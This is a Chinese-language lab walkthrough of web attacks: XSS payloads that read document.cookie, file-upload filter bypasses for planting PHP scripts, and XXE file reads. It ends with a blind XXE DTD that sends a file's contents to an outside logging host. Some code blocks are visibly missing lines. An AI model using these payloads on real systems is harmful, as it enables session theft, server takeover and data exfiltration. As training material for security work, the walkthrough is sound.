前言
==

沉下心去努力，总有意外的收获。

XSS
===

反射型XSS
------

没有任何过滤直接回显。  
`?xss=<s cript>a lert(1)</s cript>`

输出在s cript中
-----------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-201d79c8c61b903d6f8356d0a786fbe783ecfeda.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-201d79c8c61b903d6f8356d0a786fbe783ecfeda.png)  
这种直接输出在s cript标签中可以说是任意js执行了。  
输出在`a lert()`中，传入括号进行闭合再进行注释即可。  
`?xss=123');a lert('xss')//`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-feb3e0cc1f3347d51345fc2a3b0c1b505b9ae184.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-feb3e0cc1f3347d51345fc2a3b0c1b505b9ae184.png)

输出在s cript中\_2
--------------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-31e259847233d4985cac5f9273a48e99ae130b05.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-31e259847233d4985cac5f9273a48e99ae130b05.png)  
过滤了尖括号和斜杠，不能用注释，可以用闭合，而且本身就输出在s cript标签中，限制不大。  
`?xss=');a lert(document.cookie);console.log('`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e14337ac754c3d031fc54d690e292ba6a24d842.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e14337ac754c3d031fc54d690e292ba6a24d842.png)

输出在html属性中
----------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9354449dfd5f7def37ff5707d2dc6ca4b4acd5c6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9354449dfd5f7def37ff5707d2dc6ca4b4acd5c6.png)  
输出在img标签的src属性中，那么可以用o nerror事件触发，也可以利用闭合构造一对s cript标签。  
`?xss=xss" o nerror="a lert('1');`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b4aa72dbfb480d9b45eac1273754500bb2c4dd7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b4aa72dbfb480d9b45eac1273754500bb2c4dd7.png)  
`?xss=xss"><s cript>a lert('xss');</s cript>`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-26b146bb3bc7bc00277d49764dd123d4181714b2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-26b146bb3bc7bc00277d49764dd123d4181714b2.png)  
条件还是比较宽松，自由发挥。

输出在注释中
------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ebbbcb1a1a6968e847340b6c21f3fd28d650f659.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ebbbcb1a1a6968e847340b6c21f3fd28d650f659.png)  
源码中也提示了换行符。`//`是单行注释，所以换行就不生效了。  
`?xss=123%0aa lert('xss');`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d95a5e60191bfd4722ef9e0afc2a1c4913a43bdd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d95a5e60191bfd4722ef9e0afc2a1c4913a43bdd.png)

J avas cript被过滤
---------------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-191cf1ac28dc895f249faa5e0bf5413f6069f025.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-191cf1ac28dc895f249faa5e0bf5413f6069f025.png)  
输出到了a标签的href属性。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d3337eae1f779cd1a9927df8ff86a25b122b75a6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d3337eae1f779cd1a9927df8ff86a25b122b75a6.png)  
首先一眼看去就是可以大小写绕过  
`?xss=J avas cript:a lert(document.cookie);`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-595416810c31b4a0f7da0f07b33fafe65525a90b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-595416810c31b4a0f7da0f07b33fafe65525a90b.png)  
还可以利用实体编码绕过  
`?xss=j%26%2397;vas cript:a lert(%26%2339;xss%26%2339;);`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-851a3561feaaa3b74c67e7f2c67132316b59ea24.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-851a3561feaaa3b74c67e7f2c67132316b59ea24.png)  
需要点击才能触发，不是0click不完美。

等号问题
----

也是输出在img的src中。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01d733ca19825297fb249b9e0a9d375a1ae4bcd4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01d733ca19825297fb249b9e0a9d375a1ae4bcd4.png)  
用上面的payload打不行  
`?xss=xss" o nerror="a lert('1');`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce57d4c9a2422765012321415dd064818ee7fae2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce57d4c9a2422765012321415dd064818ee7fae2.png)  
看一下源码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-38f712d8ca6e50af060ff7b821a84a626e354de9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-38f712d8ca6e50af060ff7b821a84a626e354de9.png)  
有一个正则匹配，等号两边随意加个空格就饶过去了。  
`?xss=xss" o nerror ="a lert('1');`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-692bd41ac76c996b4f967441fd43ff3eb13d5096.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-692bd41ac76c996b4f967441fd43ff3eb13d5096.png)

o nerror输出故障
------------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8a2c95955a650e5a69de27df32d822ffbf09994b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8a2c95955a650e5a69de27df32d822ffbf09994b.png)  
这个正则针对性的过滤了，但又没完全过滤。  
上面的payload也能打，也不知道是不是非预期了。

DOM型XSS1
--------

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ee5a43fb49260b1ca6661e6332c8780c16c9f5f2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ee5a43fb49260b1ca6661e6332c8780c16c9f5f2.png)  
这个是通过js的dom操作改变了标签内容。实质上还是输出在了s cript中，同样利用闭合和注释就能执行任意js代码了。  
`?xss=";a lert(document.cookie);//`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-83ba8ffb345444198ec706d22bf85d7846da9397.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-83ba8ffb345444198ec706d22bf85d7846da9397.png)

DOM型XSS2
--------

查看js代码

```html
<div class="card">
    PHP代码如下:
  <s cript>
    var hash = unescape(location.hash);
    document.getElementById('code').innerHTML="PHP代码如下:"+hash;
    document.getElementById('code').title=hash
  </s cript>
</div>
```

可控的就是`location.hash`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ddf24dd8711ae7a6a91caef3e217eafd0a71eaec.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ddf24dd8711ae7a6a91caef3e217eafd0a71eaec.png)  
取值就是url中`#`和后面的串。

`unescape`可以解码`escape`编码的结果。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-93692e31e53101b172fd7cd97c4b753668ba2ba9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-93692e31e53101b172fd7cd97c4b753668ba2ba9.png)  
好像就是url编码，影响不大。

因为可以将我们的输出插入到code标签中，考虑插入一个img标签然后用o nerror触发js。  
`xss_nine#<img src=xss o nerror="a lert(1)">`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-91df4c115e8ac257c2750033ebc81b3bb8edab72.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-91df4c115e8ac257c2750033ebc81b3bb8edab72.png)

DOM型XSS3
--------

查看源代码

```html
<div class="card">
  
    <?
echo 'xxxxxx' ?>
  
  <s cript>
    var url = unescape(location.href);
    var allargs = url.split("?")[1];
    if (allargs != null && allargs.indexOf('&') > 0) {
      var arg = allargs.split('&');
      for (var i = 0; i < arg.length; i++) {
        var argx = arg[i].split('=')[1];
        e val('var a="' + argx + '";');
      }
    }
  </s cript>
</div>
```

不难看出，会将url每个参数中的值拼接到`var a="$param_value";`执行。  
尝试闭合进行代码注入  
`?asd="a lert(document.cookie);&`  
发现`"`被`unescape`转义掉了。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0aa21638ef20e7bf716d7445231c554ac2ac4501.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0aa21638ef20e7bf716d7445231c554ac2ac4501.png)  
将其进行url编码。  
`?asd=%22;a lert(document.cookie);//&`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c8ad8fc4e77b8ded9d325a121cfe84c3f8a5846.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c8ad8fc4e77b8ded9d325a121cfe84c3f8a5846.png)

DOM型XSS4
--------

查看源代码

```html
<div class="card">
  <i f rame src='http://www.f4ckweb.top/' id='if'></i f rame>
  <s cript>
    function test(test) {
      if (test.indexOf('J avas cript:')) {
        return ''
      } else {
        return unescape(test)
      }
    }
    var ifx = document.getElementById('if');
    if (location.href.indexOf('?') > 0) {
      ifx.src = test(location.href.split('?')[1].split('=')[1])
    }
  </s cript>
</div>
```

同样的通过第一个get的参数控制i f rame标签的src属性。  
注意到test过滤函数。  
检测了`J avas cript:`伪协议，但是这个写法存在问题。  
传入`?xss=J avas cript:a lert(document.cookie)`依然执行。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a80a3bfd75edbbf8b7413fc6a53c49d807c67ce.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a80a3bfd75edbbf8b7413fc6a53c49d807c67ce.png)  
因为`indexOf`返回的是第一个字符下标，而我们的payload中`J avas cript:`位于开头，返回`0`，从而绕过了该分支。

文件上传
====

任意文件上传漏洞
--------

文件上传的本意是给用户提供一个上传文件到服务器的服务，但是如果不对上传的文件进行检查，就会被攻击者利用，往服务器中上传恶意脚本文件，从而获得服务器控制权。  
文件上传是常见的功能，网站各处的功能都有可能出现上传点。最常见的就是头像上传、LOGO上传。

首先来学习一下，PHP网站文件上传的流程。  
我们通过表单提交进行文件上传时并不是直接传到站点目录的。  
PHP会从表单中拿到文件，并存到一个临时的位置。  
然后会通过`move_uploaded_file(string $filename, string $destination)`方法将临时文件移动到开发者指定的位置。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f2336dd87dc5b344a23ee9f56f5d57cc3ddbb247.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f2336dd87dc5b344a23ee9f56f5d57cc3ddbb247.png)  
所以在审计PHP源码时，可以通过全局搜索`move_uploaded_file`来定位上传点，再进行回溯分析是否过滤严格。

### 实战

来到题目，这一题是没有任何过滤的上传，主要是熟悉文件上传的流程。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-547ad52cbe9fc93b7c46a4a47ddce563f39190b8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-547ad52cbe9fc93b7c46a4a47ddce563f39190b8.png)  
选择一张图片进行上传，然后抓包。这一操作可以绕过前端js的检查。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-25ddd0ef00e6a78b7f25bca63791d99ed503658e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-25ddd0ef00e6a78b7f25bca63791d99ed503658e.png)  
这就是表单数据，我们对文件名和内容进行修改。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4f91d5d699b01691bec6fe82b0b7d8b0c98b6197.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4f91d5d699b01691bec6fe82b0b7d8b0c98b6197.png)  
然后发包。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ca0f52ac8aa232289c5d16647c3ae858c947c22c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ca0f52ac8aa232289c5d16647c3ae858c947c22c.png)  
可以看到文件首先会被上传到一个临时的地方。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5dbc4a56eb1fd730d72d9c50d2b136a33df041b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5dbc4a56eb1fd730d72d9c50d2b136a33df041b.png)  
然后题目并没有上传成功，这是因为页面表单的文件参数名字是`upload_file`，而后端代码取的是参数为`file`的文件。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c6eb405fdde638cb8b84e3e13abc5a9fa0344709.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c6eb405fdde638cb8b84e3e13abc5a9fa0344709.png)  
也不知道是不是靶场开发者故意的。  
那么我们重新修改一下表单再次发包，同时需要在站点根目录新建一个`uploads`文件夹，否则也会上传失败。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b2a630a833073b859e2929ffcb1058a21ff8eb28.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b2a630a833073b859e2929ffcb1058a21ff8eb28.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf0f1696708c4769cc50945d3fd2c5cd10337f19.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf0f1696708c4769cc50945d3fd2c5cd10337f19.png)  
可以看到上传成功，拿到了文件路径。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c980a88f90fd365d320aa7fa36f77f1e85d0ca6b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c980a88f90fd365d320aa7fa36f77f1e85d0ca6b.png)  
成功解析。

基于黑名单的文件上传
----------

黑名单过滤是禁止上传规定后缀的文件。  
绕过思路有几种：

- 寻找没有被禁用的后缀：`pht, phpt, phtml, php3, php4, php5, php::$DATA`等。
- 大小写绕过：`Php, PhP`等
- 解析问题：`中间件解析漏洞, 上传.htaccess`等。
- 文件包含：`上传.user.ini, 配合文件包含`

### 实战

来到题目  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc0d59ef534af843dad892b42df267c8075c3df5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc0d59ef534af843dad892b42df267c8075c3df5.png)  
**大小写绕过**  
很明显的，我们可以通过大小写绕过。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d21becf8b2e5993fdaa5f872cb13899eba786591.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d21becf8b2e5993fdaa5f872cb13899eba786591.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4b2a039c4358e1519885566616bf7ebd86e90161.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4b2a039c4358e1519885566616bf7ebd86e90161.png)  
**其它后缀绕过**  
也可以上传没有被禁用的后缀。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5db6a9a03be27def0c3141a6bab8ae95c31780f8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5db6a9a03be27def0c3141a6bab8ae95c31780f8.png)  
**(nginx).user.ini文件包含**  
还可以配合文件解析，先上传123.txt。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-25bdee7ff00c1ff25da4530da6e28c5dfdc7f416.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-25bdee7ff00c1ff25da4530da6e28c5dfdc7f416.png)  
因为使用的是nginx所以上传.user.ini  
`auto_prepend_file=123.txt`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d4fef7e5504aff6b2c30a910a6e521d0a68dcbdd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d4fef7e5504aff6b2c30a910a6e521d0a68dcbdd.png)  
这样只要我们访问`.user.ini`同目录下的php文件都会包含`123.txt`的代码。  
新建一个空的php文件。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-53ce78568428111d077d3f6607db9c8ff32fe5d2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-53ce78568428111d077d3f6607db9c8ff32fe5d2.png)  
然后访问  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-14221e20e1f8ad77e71100b286e56272e5af49b2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-14221e20e1f8ad77e71100b286e56272e5af49b2.png)  
可以看到被成功解析了。  
**(apache).htaccess**  
apache环境下可以利用.htaccess配置文件

```php
文件包含
php_value auto_prepend_file 文件绝对路径（默认为当前上传的目录）

文件解析
AddType application/x-httpd-php .xxx

<FilesMatch "shell.txt">
    SetHandler application/x-httpd-php
</FilesMatch>
```

第一个是文件包含，和`.user.ini`大同小异就不演示了。  
演示一下文件解析。首先上传`.htaccess`，这个`xxx`是自己定的后缀。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f0d1ffcd5cce7d54e365d71d0940f7b6d5e6596e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f0d1ffcd5cce7d54e365d71d0940f7b6d5e6596e.png)  
上传成功后，只要是`xxx`后缀的文件被访问，都会被`php`解析。  
接着再上传一个`1.xxx`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bff80150b5d2f4c16e91349961600faf775c5143.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bff80150b5d2f4c16e91349961600faf775c5143.png)  
然后访问`1.xxx`即可。  
由于笔者使用phpstudy带的php是NTS(Non Thread Safe)版，不支持这种方式，所以就不能继续演示了。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d902aa3b23281cfa57112d374990c0dab1654330.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d902aa3b23281cfa57112d374990c0dab1654330.png)  
而另一个就是TS版本，搭配apache都推荐使用TS版本。

基于白名单的文件上传
----------

白名单只允许指定后缀的文件上传，相对黑名单来说安全性高很多很多。  
常见的绕过就是经典的00截断和服务器中间件的解析漏洞。

- 00截断需要PHP版本&lt;5.3.4
- 解析漏洞比较新的就是IIS7.5解析漏洞

两种绕过的利用条件都很苛刻，实际场景出现比较少。

### 实战

回到题目  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71e1e1d1e901753b6975e21141cbf69b71877ac7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71e1e1d1e901753b6975e21141cbf69b71877ac7.png)  
抓包上传时构造`1.php\x00.jpg`文件名，在`move_uploaded_file`时就会将后面的.jpg截断。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ad1acf5653b5b1589c9be471fa86b893743a5193.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ad1acf5653b5b1589c9be471fa86b893743a5193.png)  
因为环境问题就不能演示上传后的效果了。

基于type检测的文件上传
-------------

所谓type检测就是检查文件的MIME类型，就是请求包中的`Content-Type`字段  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-78c3545cde750078503093a571ad53ff098546ed.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-78c3545cde750078503093a571ad53ff098546ed.png)  
该字段是可以修改的，常见的就是这几个：

- image/gif ：gif图片格式
- image/jpeg ：jpg图片格式
- image/png ：png图片格式

一般服务器都是允许上传图片的，所以常常都是用这几个绕过。

### 实战

回到题目  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-860e8d550e46455bf174210aa7a6f2874506b72d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-860e8d550e46455bf174210aa7a6f2874506b72d.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-10f4bbedf62a13e7d220d8346ed3e8f22ad59cb6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-10f4bbedf62a13e7d220d8346ed3e8f22ad59cb6.png)  
可以看到后端检查了文件的MIME类型。  
我们直接抓包修改  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3287537c3b48b5385e8215bfe8f002eb3563f178.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3287537c3b48b5385e8215bfe8f002eb3563f178.png)  
发包  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-62f08ad2555bc305f022742851f04cfa759f13de.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-62f08ad2555bc305f022742851f04cfa759f13de.png)  
上传成功。（请无视我写错的代码~

基于内容检测的文件上传
-----------

内容检测一般都是读取上传文件的头几个文件标记字节进行检测。  
所以我们只需要在php代码前面加上这几个符合要求的标记字节就可以了。  
常用的就是GIF头文件标记：`GIF89a`

### 实战

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-41460e0559f7ab5315fc2ae50b5be6558c4e6dc7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-41460e0559f7ab5315fc2ae50b5be6558c4e6dc7.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7f50454f8882a056f0f7ef3145c17f9d2f82aa0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7f50454f8882a056f0f7ef3145c17f9d2f82aa0.png)  
我们抓包，然后在代码前加上`GIF89a`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3f7bf67deea19b61e2f21d6fecef97e35775b2a8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3f7bf67deea19b61e2f21d6fecef97e35775b2a8.png)  
发包后调试，可以看到走入了gif的分支。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2d021e2520278c5fc7ed321bb8dc1066785039c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d2d021e2520278c5fc7ed321bb8dc1066785039c.png)  
稳稳的上传成功。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d6196bc0209b492077000a973a9241b2194c4961.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d6196bc0209b492077000a973a9241b2194c4961.png)

XXE
===

XXE(XML External Entity Injection)即：XML外部实体注入

**直接搬运某文库的资料：**  
当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害  
**注意：**执行系统命令(安装expect扩展的PHP环境里才有)

XML基础
-----

XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型.  
是一种允许用户对自己的标记语言进行定义的源语言。  
XML文档结构包括XML声明、DTD文档类型定义、文档元素。

```TEXT
<?XML version="1.0" ?><!--XML声明-->

<!ELEMENT name (#PCDATA)>
<!ELEMENT sex  (#PCDATA)>
<!ELEMENT age (#PCDATA)>
]><!--DTD文档类型定义-->
<user>
    <name>SNCKER</name>
  <sex>woman</sex>
  <age>3</age>
</user><!--文档元素-->
```

DTD(文档类型定义)的作用是定义XML文档的合法构建模块。  
DTD 可以在 XML 文档内声明，也可以外部引用。  
PCDATA 指的是被解析的字符数据（Parsed Character Data）  
XML解析器通常会解析XML文档中所有的文本

```TEXT
<message>此文本会被解析</message>
```

当某个XML元素被解析时，其标签之间的文本也会被解析：

```TEXT
<name><first>Bill</first><last>Gates</last></name>
```

```TEXT
<!--内部声明DTD-->

<!--引用外部DTD-->

<!--或者-->


<!--DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。-->
<!--内部声明实体-->
<!ENTITY 实体名称 "实体的值">
<!--引用外部实体-->
<!ENTITY 实体名称 SYSTEM "URI">
<!--或者-->
<!ENTITY 实体名称 PUBLIC "public_ID" "URI">
```

恶意引入外部实体的三种方法
-------------

### 本地引入

XML内容：

```TEXT
<?XML version="1.0" ?> <!--XML声明-->

]><!--DTD文档类型定义-->
<root>&file;</root><!--文档元素-->
```

一个实体由三部分构成：一个与号 `&`，一个实体名称,，以及一个分号`;`

### 远程引入1

XML内容：

```TEXT
<?XML version="1.0" ?>

%d;
]>
<root>&file;</root>
```

DTD文件(evil.dtd)内容：

```TEXT
<!ENTITY file SYSTEM "file:///etc/passwd">
```

### 远程引入2

```TEXT
<?XML version="1.0" ?>

<root>&file;</root>
```

DTD文件(evil.dtd)内容：

```TEXT
<!ENTITY file SYSTEM "file:///etc/passwd">
```

回显型XXE
------

首先一点是xxe只跟libXML版本有关系，2.9.0以后默认禁止了引入外部实体，所以需要切换一个低版本的libXML。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-730a078c3e4cea69ee1cda69ded285a488610922.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-730a078c3e4cea69ee1cda69ded285a488610922.png)  
回到题目  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a90e7af9bde0d5d089b12a9a36b1be5d6289e6d0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a90e7af9bde0d5d089b12a9a36b1be5d6289e6d0.png)  
根据题目知道程序会解析`name`标签的内容并且回显出来。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-474eef7aac445eb9f604ecbacf84961ff96481cc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-474eef7aac445eb9f604ecbacf84961ff96481cc.png)  
先抓POST包，然后把`Content-Type`改为`text/XML`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-929eca4da4c5410725bf1b63ce4601b3ebbd6ce4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-929eca4da4c5410725bf1b63ce4601b3ebbd6ce4.png)  
写一段正常的XML测试。

```TEXT
<root><name>123</name></root>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e33ba4a8cc256ae7cae47f1060a63b600c1f42d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e33ba4a8cc256ae7cae47f1060a63b600c1f42d.png)  
正常回显。

**本地引入**  
我们利用外部实体引入来读取文件。

```TEXT
<?XML version="1.0"?>

]>
<root>
<name>&file;</name>
</root>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6da84524bc610b64aa642f84e8882ecf4a3a9de9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6da84524bc610b64aa642f84e8882ecf4a3a9de9.png)  
读取成功。  
如果单纯的读取明文，当文件出现`<>`这种特殊字符就影响解析。  
那么可以利用php伪协议强大的过滤器对读取结果进行b ase64编码。

```TEXT
<?XML version="1.0"?>

]>
<root>
<name>&file;</name>
</root>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4e670b8135b1ad9d40b14337bded2fde9fc11072.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4e670b8135b1ad9d40b14337bded2fde9fc11072.png)  
附带一张不同环境下分别支持的协议总结列表  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8668bdb935c5e73202c86259e8abd7d3f0e92b5d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8668bdb935c5e73202c86259e8abd7d3f0e92b5d.png)

**远程引入**  
首先新建一个DTD  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ec1acdd68384c63f388699fa8ceb2a9eb8c007ea.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ec1acdd68384c63f388699fa8ceb2a9eb8c007ea.png)

```TEXT
<!ENTITY file SYSTEM "file:///D:/flag.txt">
```

一般是放在服务器上给目标主机访问，因为是自己的靶场所以我这里放在站点根目录。  
然后构造数据包：

```TEXT
<?XML version="1.0" ?>

%d;
]>
<root>
<name>&file;</name>
</root>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b23a1a0f68e6ed98e813fc2744e93d9b96180283.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b23a1a0f68e6ed98e813fc2744e93d9b96180283.png)  
发包  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1c19779086e52d32bdd82faf1af83b243dd55fb0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1c19779086e52d32bdd82faf1af83b243dd55fb0.png)  
读取成功。  
另外的一种远程引入``方法一直复现不出来。  
经过搜寻资料，XML引入外部DTD会用`SYSTEM/PUBLIC`两个关键词，其中`SYSTEM`用于引用本地的，而`PUBLIC`则用于引用网络上的。  
那按道理应该使用`PUBLIC`引入远程的DTD。

```TEXT

```

但是依旧复现不出来。可能是环境的问题，也可能是网上资料的问题。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a4355e388061ecb935ec5d20d7631b18f19c9f5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a4355e388061ecb935ec5d20d7631b18f19c9f5.png)  
也不需要纠结，毕竟另外一种方法是可行的。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5f4430564a09d7c96f9aeb1ced02d3d5655b1a3f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5f4430564a09d7c96f9aeb1ced02d3d5655b1a3f.png)

盲型XXE
-----

盲型XXE(Blind XXE)，也就是页面上不展示XML数据的解析结果。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c7e22333bd2a384fe9ef5c08cbb668f72afe89d0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c7e22333bd2a384fe9ef5c08cbb668f72afe89d0.png)  
从源码可以看到并没有将解析后的结果渲染出来。  
因为XML解析是可以请求外部的DTD，所以可以通过请求把数据外带出来。  
首先远程引入的payload不变：

```TEXT
<?XML version="1.0" ?>

%d;
]>
<root>
<name>&file;</name>
</root>
```

然后修改我们的DTD：

```TEXT
<!ENTITY % file SYSTEM "php://filter/convert.b ase64-encode/resource=D:/flag.txt">
<!ENTITY % remote "<!ENTITY &#37; send SYSTEM 'http://cp4brx.ceye.io/?data=%file;'>">
%remote;
%send;
```

`%`是对参数实体的声明，声明后就可以在后续引用参数实体。  
